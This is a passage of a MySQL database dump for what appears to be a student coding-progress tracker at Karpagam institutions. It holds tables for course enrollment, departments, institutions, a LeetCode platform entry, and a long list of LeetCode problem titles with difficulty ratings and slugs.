INSERT INTO `track_course_enrollement` VALUES (1,1,3),(2,2,156),(3,2,157),(4,2,158),(5,2,159),(6,2,160),(7,2,161),(8,2,162),(9,2,163),(10,2,164),(11,2,165),(12,2,166),(13,2,167),(14,2,168),(15,2,169),(16,2,170),(17,2,171),(18,2,154),(19,2,172),(20,2,173),(21,2,174),(22,2,175),(23,2,176),(24,2,177),(25,2,178),(26,2,179),(27,2,180),(28,2,181),(29,2,182),(30,2,183),(31,2,184),(32,2,185),(33,2,186),(34,2,187),(35,2,188),(36,2,189),(37,2,190),(38,2,191),(39,2,192),(40,2,193),(41,2,194),(42,2,195),(43,2,196),(44,2,197),(45,2,198),(46,2,199),(47,2,200),(48,2,201),(49,2,202),(50,2,203),(51,2,204),(52,2,205),(53,2,206),(54,2,207),(55,2,208),(56,2,209),(57,2,210),(58,2,211),(59,2,212),(60,2,213),(61,2,214),(62,2,215),(63,2,216),(64,2,217),(65,2,218),(66,2,219),(67,2,220),(68,2,221),(69,2,222),(70,2,223),(71,2,224),(72,2,225),(73,2,226),(74,2,227),(75,2,228),(76,2,229),(77,2,230),(78,2,231),(79,2,232),(80,2,233),(81,2,234),(82,2,235),(83,2,236),(84,2,237),(85,2,238),(86,2,239),(87,2,240),(88,2,241),(89,2,242),(90,2,243),(91,2,244),(92,2,245),(93,2,246),(94,2,247),(95,2,248),(96,1,127),(97,1,128),(98,1,129),(99,1,130),(100,1,131),(101,1,132),(102,1,133),(103,1,134),(104,1,135),(105,1,136),(106,1,137),(107,1,138),(108,1,139),(109,1,140),(110,1,141),(111,1,142),(112,1,143),(113,1,144),(114,1,145),(115,1,146),(116,1,147),(117,1,148),(118,1,149),(119,1,150),(120,1,151);
/*!40000 ALTER TABLE `track_course_enrollement` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `track_department`
--

DROP TABLE IF EXISTS `track_department`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `track_department` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `short_name` varchar(6) NOT NULL,
  `name` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `track_department`
--

LOCK TABLES `track_department` WRITE;
/*!40000 ALTER TABLE `track_department` DISABLE KEYS */;
INSERT INTO `track_department` VALUES (1,'CSE','Computer Science and Engineering'),(2,'IT','Information Technology'),(3,'AI','Artificial Intelligence and Data Science'),(4,'ECE','Electronics and Communication Engineering'),(5,'EEE','Electrical and Electronics Engineering'),(6,'Mech','Mechanical Engineering'),(7,'CSD','Computer Science and Design Engineering'),(8,'CST','Computer Science and Technology'),(9,'Cyber','Cyber Security'),(10,'Civil','Civil Engineering'),(11,'ETE','Electronics and Tele Communication Engineering');
/*!40000 ALTER TABLE `track_department` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `track_institution`
--

DROP TABLE IF EXISTS `track_institution`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `track_institution` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `track_institution`
--

LOCK TABLES `track_institution` WRITE;
/*!40000 ALTER TABLE `track_institution` DISABLE KEYS */;
INSERT INTO `track_institution` VALUES (1,'Karpagam Institute of Technology'),(2,'Karpagam College of Engineering'),(3,'Karpagam Academy of Higher Education');
/*!40000 ALTER TABLE `track_institution` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `track_platform`
--

DROP TABLE IF EXISTS `track_platform`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `track_platform` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `url` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `track_platform`
--

LOCK TABLES `track_platform` WRITE;
/*!40000 ALTER TABLE `track_platform` DISABLE KEYS */;
INSERT INTO `track_platform` VALUES (1,'Leet Code','https://leetcode.com/problems/');
/*!40000 ALTER TABLE `track_platform` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `track_problem`
--

DROP TABLE IF EXISTS `track_problem`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `track_problem` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `problem_title` varchar(255) NOT NULL,
  `complexity` varchar(50) DEFAULT NULL,
  `problem_slug` varchar(255) DEFAULT NULL,
  `platform_id` bigint NOT NULL,
  PRIMARY KEY (`id`),
  KEY `track_problem_platform_id_bb8224e4_fk_track_platform_id` (`platform_id`),
  CONSTRAINT `track_problem_platform_id_bb8224e4_fk_track_platform_id` FOREIGN KEY (`platform_id`) REFERENCES `track_platform` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2969 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `track_problem`
--

LOCK TABLES `track_problem` WRITE;
/*!40000 ALTER TABLE `track_problem` DISABLE KEYS */;
INSERT INTO `track_problem` VALUES (1,'Two Sum','Easy','two-sum',1),(2,'Add Two Numbers','Medium','add-two-numbers',1),(3,'Longest Substring Without Repeating Characters','Medium','longest-substring-without-repeating-characters',1),(4,'Median of Two Sorted Arrays','Hard','median-of-two-sorted-arrays',1),(5,'Longest Palindromic Substring','Medium','longest-palindromic-substring',1),(6,'Zigzag Conversion','Medium','zigzag-conversion',1),(7,'Reverse Integer','Medium','reverse-integer',1),(8,'String to Integer (atoi)','Medium','string-to-integer-atoi',1),(9,'Palindrome Number','Easy','palindrome-number',1),(10,'Regular Expression Matching','Hard','regular-expression-matching',1),(11,'Container With Most Water','Medium','container-with-most-water',1),(12,'Integer to Roman','Medium','integer-to-roman',1),(13,'Roman to Integer','Easy','roman-to-integer',1),(14,'Longest Common Prefix','Easy','longest-common-prefix',1),(15,'3Sum','Medium','3sum',1),(16,'3Sum Closest','Medium','3sum-closest',1),(17,'Letter Combinations of a Phone Number','Medium','letter-combinations-of-a-phone-number',1),(18,'4Sum','Medium','4sum',1),(19,'Remove Nth Node From End of List','Medium','remove-nth-node-from-end-of-list',1),(20,'Valid Parentheses','Easy','valid-parentheses',1),(21,'Merge Two Sorted Lists','Easy','merge-two-sorted-lists',1),(22,'Generate Parentheses','Medium','generate-parentheses',1),(23,'Merge k Sorted Lists','Hard','merge-k-sorted-lists',1),(24,'Swap Nodes in Pairs','Medium','swap-nodes-in-pairs',1),(25,'Reverse Nodes in k-Group','Hard','reverse-nodes-in-k-group',1),(26,'Remove Duplicates from Sorted Array','Easy','remove-duplicates-from-sorted-array',1),(27,'Remove Element','Easy','remove-element',1),(28,'Find the Index of the First Occurrence in a String','Easy','find-the-index-of-the-first-occurrence-in-a-string',1),(29,'Divide Two Integers','Medium','divide-two-integers',1),(30,'Substring with Concatenation of All Words','Hard','substring-with-concatenation-of-all-words',1),(31,'Next Permutation','Medium','next-permutation',1),(32,'Longest Valid Parentheses','Hard','longest-valid-parentheses',1),(33,'Search in Rotated Sorted Array','Medium','search-in-rotated-sorted-array',1),(34,'Find First and Last Position of Element in Sorted Array','Medium','find-first-and-last-position-of-element-in-sorted-array',1),(35,'Search Insert Position','Easy','search-insert-position',1),(36,'Valid Sudoku','Medium','valid-sudoku',1),(37,'Sudoku Solver','Hard','sudoku-solver',1),(38,'Count and Say','Medium','count-and-say',1),(39,'Combination Sum','Medium','combination-sum',1),(40,'Combination Sum II','Medium','combination-sum-ii',1),(41,'First Missing Positive','Hard','first-missing-positive',1),(42,'Trapping Rain Water','Hard','trapping-rain-water',1),(43,'Multiply Strings','Medium','multiply-strings',1),(44,'Wildcard Matching','Hard','wildcard-matching',1),(45,'Jump Game II','Medium','jump-game-ii',1),(46,'Permutations','Medium','permutations',1),(47,'Permutations II','Medium','permutations-ii',1),(48,'Rotate Image','Medium','rotate-image',1),(49,'Group Anagrams','Medium','group-anagrams',1),(50,'Pow(x, n)','Medium','powx-n',1),(51,'N-Queens','Hard','n-queens',1),(52,'N-Queens II','Hard','n-queens-ii',1),(53,'Maximum Subarray','Medium','maximum-subarray',1),(54,'Spiral Matrix','Medium','spiral-matrix',1),(55,'Jump Game','Medium','jump-game',1),(56,'Merge Intervals','Medium','merge-intervals',1),(57,'Insert Interval','Medium','insert-interval',1),(58,'Length of Last Word','Easy','length-of-last-word',1),(59,'Spiral Matrix II','Medium','spiral-matrix-ii',1),(60,'Permutation Sequence','Hard','permutation-sequence',1),(61,'Rotate List','Medium','rotate-list',1),(62,'Unique Paths','Medium','unique-paths',1),(63,'Unique Paths II','Medium','unique-paths-ii',1),(64,'Minimum Path Sum','Medium','minimum-path-sum',1),(65,'Valid Number','Hard','valid-number',1),(66,'Plus One','Easy','plus-one',1),(67,'Add Binary','Easy','add-binary',1),(68,'Text Justification','Hard','text-justification',1),(69,'Sqrt(x)','Easy','sqrtx',1),(70,'Climbing Stairs','Easy','climbing-stairs',1),(71,'Simplify Path','Medium','simplify-path',1),(72,'Edit Distance','Medium','edit-distance',1),(73,'Set Matrix Zeroes','Medium','set-matrix-zeroes',1),(74,'Search a 2D Matrix','Medium','search-a-2d-matrix',1),(75,'Sort Colors','Medium','sort-colors',1),(76,'Minimum Window Substring','Hard','minimum-window-substring',1),(77,'Combinations','Medium','combinations',1),(78,'Subsets','Medium','subsets',1),(79,'Word Search','Medium','word-search',1),(80,'Remove Duplicates from Sorted Array II','Medium','remove-duplicates-from-sorted-array-ii',1),(81,'Search in Rotated Sorted Array II','Medium','search-in-rotated-sorted-array-ii',1),(82,'Remove Duplicates from Sorted List II','Medium','remove-duplicates-from-sorted-list-ii',1),(83,'Remove Duplicates from Sorted List','Easy','remove-duplicates-from-sorted-list',1),(84,'Largest Rectangle in Histogram','Hard','largest-rectangle-in-histogram',1),(85,'Maximal Rectangle','Hard','maximal-rectangle',1),(86,'Partition List','Medium','partition-list',1),(87,'Scramble String','Hard','scramble-string',1),(88,'Merge Sorted Array','Easy','merge-sorted-array',1),(89,'Gray Code','Medium','gray-code',1),(90,'Subsets II','Medium','subsets-ii',1),(91,'Decode Ways','Medium','decode-ways',1),(92,'Reverse Linked List II','Medium','reverse-linked-list-ii',1),(93,'Restore IP Addresses','Medium','restore-ip-addresses',1),(94,'Binary Tree Inorder Traversal','Easy','binary-tree-inorder-traversal',1),(95,'Unique Binary Search Trees II','Medium','unique-binary-search-trees-ii',1),(96,'Unique Binary Search Trees','Medium','unique-binary-search-trees',1),(97,'Interleaving String','Medium','interleaving-string',1),(98,'Validate Binary Search Tree','Medium','validate-binary-search-tree',1),(99,'Recover Binary Search Tree','Medium','recover-binary-search-tree',1),(100,'Same Tree','Easy','same-tree',1),(101,'Symmetric Tree','Easy','symmetric-tree',1),(102,'Binary Tree Level Order Traversal','Medium','binary-tree-level-order-traversal',1),(103,'Binary Tree Zigzag Level Order Traversal','Medium','binary-tree-zigzag-level-order-traversal',1),(104,'Maximum Depth of Binary Tree','Easy','maximum-depth-of-binary-tree',1),(105,'Construct Binary Tree from Preorder and Inorder Traversal','Medium','construct-binary-tree-from-preorder-and-inorder-traversal',1),(106,'Construct Binary Tree from Inorder and Postorder Traversal','Medium','construct-binary-tree-from-inorder-and-postorder-traversal',1),(107,'Binary Tree Level Order Traversal II','Medium','binary-tree-level-order-traversal-ii',1),(108,'Convert Sorted Array to Binary Search Tree','Easy','convert-sorted-array-to-binary-search-tree',1),(109,'Convert Sorted List to Binary Search Tree','Medium','convert-sorted-list-to-binary-search-tree',1),(110,'Balanced Binary Tree','Easy','balanced-binary-tree',1),(111,'Minimum Depth of Binary Tree','Easy','minimum-depth-of-binary-tree',1),(112,'Path Sum','Easy','path-sum',1),(113,'Path Sum II','Medium','path-sum-ii',1),(114,'Flatten Binary Tree to Linked List','Medium','flatten-binary-tree-to-linked-list',1),(115,'Distinct Subsequences','Hard','distinct-subsequences',1),(116,'Populating Next Right Pointers in Each Node','Medium','populating-next-right-pointers-in-each-node',1),(117,'Populating Next Right Pointers in Each Node II','Medium','populating-next-right-pointers-in-each-node-ii',1),(118,'Pascal\'s Triangle','Easy','pascals-triangle',1),(119,'Pascal\'s Triangle II','Easy','pascals-triangle-ii',1),(120,'Triangle','Medium','triangle',1),(121,'Best Time to Buy and Sell Stock','Easy','best-time-to-buy-and-sell-stock',1),(122,'Best Time to Buy and Sell Stock II','Medium','best-time-to-buy-and-sell-stock-ii',1),(123,'Best Time to Buy and Sell Stock III','Hard','best-time-to-buy-and-sell-stock-iii',1),(124,'Binary Tree Maximum Path Sum','Hard','binary-tree-maximum-path-sum',1),(125,'Valid Palindrome','Easy','valid-palindrome',1),(126,'Word Ladder II','Hard','word-ladder-ii',1),(127,'Word Ladder','Hard','word-ladder',1),(128,'Longest Consecutive Sequence','Medium','longest-consecutive-sequence',1),(129,'Sum Root to Leaf Numbers','Medium','sum-root-to-leaf-numbers',1),(130,'Surrounded Regions','Medium','surrounded-regions',1),(131,'Palindrome Partitioning','Medium','palindrome-partitioning',1),(132,'Palindrome Partitioning II','Hard','palindrome-partitioning-ii',1),(133,'Clone Graph','Medium','clone-graph',1),(134,'Gas Station','Medium','gas-station',1),(135,'Candy','Hard','candy',1),(136,'Single Number','Easy','single-number',1),(137,'Single Number II','Medium','single-number-ii',1),(138,'Copy List with Random Pointer','Medium','copy-list-with-random-pointer',1),(139,'Word Break','Medium','word-break',1),(140,'Word Break II','Hard','word-break-ii',1),(141,'Linked List Cycle','Easy','linked-list-cycle',1),(142,'Linked List Cycle II','Medium','linked-list-cycle-ii',1),(143,'Reorder List','Medium','reorder-list',1),(144,'Binary Tree Preorder Traversal','Easy','binary-tree-preorder-traversal',1),(145,'Binary Tree Postorder Traversal','Easy','binary-tree-postorder-traversal',1),(146,'LRU Cache','Medium','lru-cache',1),(147,'Insertion Sort List','Medium','insertion-sort-list',1),(148,'Sort List','Medium','sort-list',1),(149,'Max Points on a Line','Hard','max-points-on-a-line',1),(150,'Evaluate Reverse Polish Notation','Medium','evaluate-reverse-polish-notation',1),(151,'Reverse Words in a String','Medium','reverse-words-in-a-string',1),(152,'Maximum Product Subarray','Medium','maximum-product-subarray',1),(153,'Find Minimum in Rotated Sorted Array','Medium','find-minimum-in-rotated-sorted-array',1),(154,'Find Minimum in Rotated Sorted Array II','Hard','find-minimum-in-rotated-sorted-array-ii',1),(155,'Min Stack','Medium','min-stack',1),(156,'Binary Tree Upside Down','Medium','binary-tree-upside-down',1),(157,'Read N Characters Given Read4','Easy','read-n-characters-given-read4',1),(158,'Read N Characters Given read4 II - Call Multiple Times','Hard','read-n-characters-given-read4-ii-call-multiple-times',1),(159,'Longest Substring with At Most Two Distinct Characters','Medium','longest-substring-with-at-most-two-distinct-characters',1),(160,'Intersection of Two Linked Lists','Easy','intersection-of-two-linked-lists',1),(161,'One Edit Distance','Medium','one-edit-distance',1),(162,'Find Peak Element','Medium','find-peak-element',1),(163,'Missing Ranges','Easy','missing-ranges',1),(164,'Maximum Gap','Medium','maximum-gap',1),(165,'Compare Version Numbers','Medium','compare-version-numbers',1),(166,'Fraction to Recurring Decimal','Medium','fraction-to-recurring-decimal',1),(167,'Two Sum II - Input Array Is Sorted','Medium','two-sum-ii-input-array-is-sorted',1),(168,'Excel Sheet Column Title','Easy','excel-sheet-column-title',1),(169,'Majority Element','Easy','majority-element',1),(170,'Two Sum III - Data structure design','Easy','two-sum-iii-data-structure-design',1),(171,'Excel Sheet Column Number','Easy','excel-sheet-column-number',1),(172,'Factorial Trailing Zeroes','Medium','factorial-trailing-zeroes',1),(173,'Binary Search Tree Iterator','Medium','binary-search-tree-iterator',1),(174,'Dungeon Game','Hard','dungeon-game',1),(175,'Combine Two Tables','Easy','combine-two-tables',1),(176,'Second Highest Salary','Medium','second-highest-salary',1),(177,'Nth Highest Salary','Medium','nth-highest-salary',1),(178,'Rank Scores','Medium','rank-scores',1),(179,'Largest Number','Medium','largest-number',1),(180,'Consecutive Numbers','Medium','consecutive-numbers',1),(181,'Employees Earning More Than Their Managers','Easy','employees-earning-more-than-their-managers',1),(182,'Duplicate Emails','Easy','duplicate-emails',1),(183,'Customers Who Never Order','Easy','customers-who-never-order',1),(184,'Department Highest Salary','Medium','department-highest-salary',1),(185,'Department Top Three Salaries','Hard','department-top-three-salaries',1),(186,'Reverse Words in a String II','Medium','reverse-words-in-a-string-ii',1),(187,'Repeated DNA Sequences','Medium','repeated-dna-sequences',1),(188,'Best Time to Buy and Sell Stock IV','Hard','best-time-to-buy-and-sell-stock-iv',1),(189,'Rotate Array','Medium','rotate-array',1),(190,'Reverse Bits','Easy','reverse-bits',1),(191,'Number of 1 Bits','Easy','number-of-1-bits',1),(192,'Word Frequency','Medium','word-frequency',1),(193,'Valid Phone Numbers','Easy','valid-phone-numbers',1),(194,'Transpose File','Medium','transpose-file',1),(195,'Tenth Line','Easy','tenth-line',1),(196,'Delete Duplicate Emails','Easy','delete-duplicate-emails',1),(197,'Rising Temperature','Easy','rising-temperature',1),(198,'House Robber','Medium','house-robber',1),(199,'Binary Tree Right Side View','Medium','binary-tree-right-side-view',1),(200,'Number of Islands','Medium','number-of-islands',1),(201,'Bitwise AND of Numbers Range','Medium','bitwise-and-of-numbers-range',1),(202,'Happy Number','Easy','happy-number',1),(203,'Remove Linked List Elements','Easy','remove-linked-list-elements',1),(204,'Count Primes','Medium','count-primes',1),(205,'Isomorphic Strings','Easy','isomorphic-strings',1),(206,'Reverse Linked List','Easy','reverse-linked-list',1),(207,'Course Schedule','Medium','course-schedule',1),(208,'Implement Trie (Prefix Tree)','Medium','implement-trie-prefix-tree',1),(209,'Minimum Size Subarray Sum','Medium','minimum-size-subarray-sum',1),(210,'Course Schedule II','Medium','course-schedule-ii',1),(211,'Design Add and Search Words Data Structure','Medium','design-add-and-search-words-data-structure',1),(212,'Word Search II','Hard','word-search-ii',1),(213,'House Robber II','Medium','house-robber-ii',1),(214,'Shortest Palindrome','Hard','shortest-palindrome',1),(215,'Kth Largest Element in an Array','Medium','kth-largest-element-in-an-array',1),(216,'Combination Sum III','Medium','combination-sum-iii',1),(217,'Contains Duplicate','Easy','contains-duplicate',1),(218,'The Skyline Problem','Hard','the-skyline-problem',1),(219,'Contains Duplicate II','Easy','contains-duplicate-ii',1),(220,'Contains Duplicate III','Hard','contains-duplicate-iii',1),(221,'Maximal Square','Medium','maximal-square',1),(222,'Count Complete Tree Nodes','Easy','count-complete-tree-nodes',1),(223,'Rectangle Area','Medium','rectangle-area',1),(224,'Basic Calculator','Hard','basic-calculator',1),(225,'Implement Stack using Queues','Easy','implement-stack-using-queues',1),(226,'Invert Binary Tree','Easy','invert-binary-tree',1),(227,'Basic Calculator II','Medium','basic-calculator-ii',1),(228,'Summary Ranges','Easy','summary-ranges',1),(229,'Majority Element II','Medium','majority-element-ii',1),(230,'Kth Smallest Element in a BST','Medium','kth-smallest-element-in-a-bst',1),(231,'Power of Two','Easy','power-of-two',1),(232,'Implement Queue using Stacks','Easy','implement-queue-using-stacks',1),(233,'Number of Digit One','Hard','number-of-digit-one',1),(234,'Palindrome Linked List','Easy','palindrome-linked-list',1),(235,'Lowest Common Ancestor of a Binary Search Tree','Medium','lowest-common-ancestor-of-a-binary-search-tree',1),(236,'Lowest Common Ancestor of a Binary Tree','Medium','lowest-common-ancestor-of-a-binary-tree',1),(237,'Delete Node in a Linked List','Medium','delete-node-in-a-linked-list',1),(238,'Product of Array Except Self','Medium','product-of-array-except-self',1),(239,'Sliding Window Maximum','Hard','sliding-window-maximum',1),(240,'Search a 2D Matrix II','Medium','search-a-2d-matrix-ii',1),(241,'Different Ways to Add Parentheses','Medium','different-ways-to-add-parentheses',1),(242,'Valid Anagram','Easy','valid-anagram',1),(243,'Shortest Word Distance','Easy','shortest-word-distance',1),(244,'Shortest Word Distance II','Medium','shortest-word-distance-ii',1),(245,'Shortest Word Distance III','Medium','shortest-word-distance-iii',1),(246,'Strobogrammatic Number','Easy','strobogrammatic-number',1),(247,'Strobogrammatic Number II','Medium','strobogrammatic-number-ii',1),(248,'Strobogrammatic Number III','Hard','strobogrammatic-number-iii',1),(249,'Group Shifted Strings','Medium','group-shifted-strings',1),(250,'Count Univalue Subtrees','Medium','count-univalue-subtrees',1),(251,'Flatten 2D Vector','Medium','flatten-2d-vector',1),(252,'Meeting Rooms','Easy','meeting-rooms',1),(253,'Meeting Rooms II','Medium','meeting-rooms-ii',1),(254,'Factor Combinations','Medium','factor-combinations',1),(255,'Verify Preorder Sequence in Binary Search Tree','Medium','verify-preorder-sequence-in-binary-search-tree',1),(256,'Paint House','Medium','paint-house',1),(257,'Binary Tree Paths','Easy','binary-tree-paths',1),(258,'Add Digits','Easy','add-digits',1),(259,'3Sum Smaller','Medium','3sum-smaller',1),(260,'Single Number III','Medium','single-number-iii',1),(261,'Graph Valid Tree','Medium','graph-valid-tree',1),(262,'Trips and Users','Hard','trips-and-users',1),(263,'Ugly Number','Easy','ugly-number',1),(264,'Ugly Number II','Medium','ugly-number-ii',1),(265,'Paint House II','Hard','paint-house-ii',1),(266,'Palindrome Permutation','Easy','palindrome-permutation',1),(267,'Palindrome Permutation II','Medium','palindrome-permutation-ii',1),(268,'Missing Number','Easy','missing-number',1),(269,'Alien Dictionary','Hard','alien-dictionary',1),(270,'Closest Binary Search Tree Value','Easy','closest-binary-search-tree-value',1),(271,'Encode and Decode Strings','Medium','encode-and-decode-strings',1),(272,'Closest Binary Search Tree Value II','Hard','closest-binary-search-tree-value-ii',1),(273,'Integer to English Words','Hard','integer-to-english-words',1),(274,'H-Index','Medium','h-index',1),(275,'H-Index II','Medium','h-index-ii',1),(276,'Paint Fence','Medium','paint-fence',1),(277,'Find the Celebrity','Medium','find-the-celebrity',1),(278,'First Bad Version','Easy','first-bad-version',1),(279,'Perfect Squares','Medium','perfect-squares',1),(280,'Wiggle Sort','Medium','wiggle-sort',1),(281,'Zigzag Iterator','Medium','zigzag-iterator',1),(282,'Expression Add Operators','Hard','expression-add-operators',1),(283,'Move Zeroes','Easy','move-zeroes',1),(284,'Peeking Iterator','Medium','peeking-iterator',1),(285,'Inorder Successor in BST','Medium','inorder-successor-in-bst',1),(286,'Walls and Gates','Medium','walls-and-gates',1),(287,'Find the Duplicate Number','Medium','find-the-duplicate-number',1),(288,'Unique Word Abbreviation','Medium','unique-word-abbreviation',1),(289,'Game of Life','Medium','game-of-life',1),(290,'Word Pattern','Easy','word-pattern',1),(291,'Word Pattern II','Medium','word-pattern-ii',1),(292,'Nim Game','Easy','nim-game',1),(293,'Flip Game','Easy','flip-game',1),(294,'Flip Game II','Medium','flip-game-ii',1),(295,'Find Median from Data Stream','Hard','find-median-from-data-stream',1),(296,'Best Meeting Point','Hard','best-meeting-point',1),(297,'Serialize and Deserialize Binary Tree','Hard','serialize-and-deserialize-binary-tree',1),(298,'Binary Tree Longest Consecutive Sequence','Medium','binary-tree-longest-consecutive-sequence',1),(299,'Bulls and Cows','Medium','bulls-and-cows',1),(300,'Longest Increasing Subsequence','Medium','longest-increasing-subsequence',1),(301,'Remove Invalid Parentheses','Hard','remove-invalid-parentheses',1),(302,'Smallest Rectangle Enclosing Black Pixels','Hard','smallest-rectangle-enclosing-black-pixels',1),(303,'Range Sum Query - Immutable','Easy','range-sum-query-immutable',1),(304,'Range Sum Query 2D - Immutable','Medium','range-sum-query-2d-immutable',1),(305,'Number of Islands II','Hard','number-of-islands-ii',1),(306,'Additive Number','Medium','additive-number',1),(307,'Range Sum Query - Mutable','Medium','range-sum-query-mutable',1),(308,'Range Sum Query 2D - Mutable','Hard','range-sum-query-2d-mutable',1),(309,'Best Time to Buy and Sell Stock with Cooldown','Medium','best-time-to-buy-and-sell-stock-with-cooldown',1),(310,'Minimum Height Trees','Medium','minimum-height-trees',1),(311,'Sparse Matrix Multiplication','Medium','sparse-matrix-multiplication',1),(312,'Burst Balloons','Hard','burst-balloons',1),(313,'Super Ugly Number','Medium','super-ugly-number',1),(314,'Binary Tree Vertical Order Traversal','Medium','binary-tree-vertical-order-traversal',1),(315,'Count of Smaller Numbers After Self','Hard','count-of-smaller-numbers-after-self',1),(316,'Remove Duplicate Letters','Medium','remove-duplicate-letters',1),(317,'Shortest Distance from All Buildings','Hard','shortest-distance-from-all-buildings',1),(318,'Maximum Product of Word Lengths','Medium','maximum-product-of-word-lengths',1),(319,'Bulb Switcher','Medium','bulb-switcher',1),(320,'Generalized Abbreviation','Medium','generalized-abbreviation',1),(321,'Create Maximum Number','Hard','create-maximum-number',1),(322,'Coin Change','Medium','coin-change',1),(323,'Number of Connected Components in an Undirected Graph','Medium','number-of-connected-components-in-an-undirected-graph',1),(324,'Wiggle Sort II','Medium','wiggle-sort-ii',1),(325,'Maximum Size Subarray Sum Equals k','Medium','maximum-size-subarray-sum-equals-k',1),(326,'Power of Three','Easy','power-of-three',1),(327,'Count of Range Sum','Hard','count-of-range-sum',1),(328,'Odd Even Linked List','Medium','odd-even-linked-list',1),(329,'Longest Increasing Path in a Matrix','Hard','longest-increasing-path-in-a-matrix',1),(330,'Patching Array','Hard','patching-array',1),(331,'Verify Preorder Serialization of a Binary Tree','Medium','verify-preorder-serialization-of-a-binary-tree',1),(332,'Reconstruct Itinerary','Hard','reconstruct-itinerary',1),(333,'Largest BST Subtree','Medium','largest-bst-subtree',1),(334,'Increasing Triplet Subsequence','Medium','increasing-triplet-subsequence',1),(335,'Self Crossing','Hard','self-crossing',1),(336,'Palindrome Pairs','Hard','palindrome-pairs',1),(337,'House Robber III','Medium','house-robber-iii',1),(338,'Counting Bits','Easy','counting-bits',1),(339,'Nested List Weight Sum','Medium','nested-list-weight-sum',1),(340,'Longest Substring with At Most K Distinct Characters','Medium','longest-substring-with-at-most-k-distinct-characters',1),(341,'Flatten Nested List Iterator','Medium','flatten-nested-list-iterator',1),(342,'Power of Four','Easy','power-of-four',1),(343,'Integer Break','Medium','integer-break',1),(344,'Reverse String','Easy','reverse-string',1),(345,'Reverse Vowels of a String','Easy','reverse-vowels-of-a-string',1),(346,'Moving Average from Data Stream','Easy','moving-average-from-data-stream',1),(347,'Top K Frequent Elements','Medium','top-k-frequent-elements',1),(348,'Design Tic-Tac-Toe','Medium','design-tic-tac-toe',1),(349,'Intersection of Two Arrays','Easy','intersection-of-two-arrays',1),(350,'Intersection of Two Arrays II','Easy','intersection-of-two-arrays-ii',1),(351,'Android Unlock Patterns','Medium','android-unlock-patterns',1),(352,'Data Stream as Disjoint Intervals','Hard','data-stream-as-disjoint-intervals',1),(353,'Design Snake Game','Medium','design-snake-game',1),(354,'Russian Doll Envelopes','Hard','russian-doll-envelopes',1),(355,'Design Twitter','Medium','design-twitter',1),(356,'Line Reflection','Medium','line-reflection',1),(357,'Count Numbers with Unique Digits','Medium','count-numbers-with-unique-digits',1),(358,'Rearrange String k Distance Apart','Hard','rearrange-string-k-distance-apart',1),(359,'Logger Rate Limiter','Easy','logger-rate-limiter',1),(360,'Sort Transformed Array','Medium','sort-transformed-array',1),(361,'Bomb Enemy','Medium','bomb-enemy',1),(362,'Design Hit Counter','Medium','design-hit-counter',1),(363,'Max Sum of Rectangle No Larger Than K','Hard','max-sum-of-rectangle-no-larger-than-k',1),(364,'Nested List Weight Sum II','Medium','nested-list-weight-sum-ii',1),(365,'Water and Jug Problem','Medium','water-and-jug-problem',1),(366,'Find Leaves of Binary Tree','Medium','find-leaves-of-binary-tree',1),(367,'Valid Perfect Square','Easy','valid-perfect-square',1),(368,'Largest Divisible Subset','Medium','largest-divisible-subset',1),(369,'Plus One Linked List','Medium','plus-one-linked-list',1),(370,'Range Addition','Medium','range-addition',1),(371,'Sum of Two Integers','Medium','sum-of-two-integers',1),(372,'Super Pow','Medium','super-pow',1),(373,'Find K Pairs with Smallest Sums','Medium','find-k-pairs-with-smallest-sums',1),(374,'Guess Number Higher or Lower','Easy','guess-number-higher-or-lower',1),(375,'Guess Number Higher or Lower II','Medium','guess-number-higher-or-lower-ii',1),(376,'Wiggle Subsequence','Medium','wiggle-subsequence',1),(377,'Combination Sum IV','Medium','combination-sum-iv',1),(378,'Kth Smallest Element in a Sorted Matrix','Medium','kth-smallest-element-in-a-sorted-matrix',1),(379,'Design Phone Directory','Medium','design-phone-directory',1),(380,'Insert Delete GetRandom O(1)','Medium','insert-delete-getrandom-o1',1),(381,'Insert Delete GetRandom O(1) - Duplicates allowed','Hard','insert-delete-getrandom-o1-duplicates-allowed',1),(382,'Linked List Random Node','Medium','linked-list-random-node',1),(383,'Ransom Note','Easy','ransom-note',1),(384,'Shuffle an Array','Medium','shuffle-an-array',1),(385,'Mini Parser','Medium','mini-parser',1),(386,'Lexicographical Numbers','Medium','lexicographical-numbers',1),(387,'First Unique Character in a String','Easy','first-unique-character-in-a-string',1),(388,'Longest Absolute File Path','Medium','longest-absolute-file-path',1),(389,'Find the Difference','Easy','find-the-difference',1),(390,'Elimination Game','Medium','elimination-game',1),(391,'Perfect Rectangle','Hard','perfect-rectangle',1),(392,'Is 